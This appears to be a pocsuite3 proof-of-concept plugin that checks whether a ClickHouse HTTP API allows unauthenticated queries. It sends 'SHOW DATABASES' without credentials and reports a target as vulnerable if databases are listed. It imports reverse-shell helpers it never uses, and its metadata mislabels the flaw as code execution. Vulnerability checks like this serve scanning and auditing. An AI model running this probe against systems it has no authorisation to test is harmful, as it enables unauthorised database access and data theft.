from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = 'ClickHouse API 数据库接口未授权访问漏洞'
    appName = 'ClickHouse'
    appVersion = '<10.0.0 '
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''ClickHouse API 数据库接口存在未授权访问漏洞，攻击者通过漏洞可以执行任意SQL命令获取数据库数据。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP


    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/?query=SHOW DATABASES"
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 and "default" in r.text and "read_bytes" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)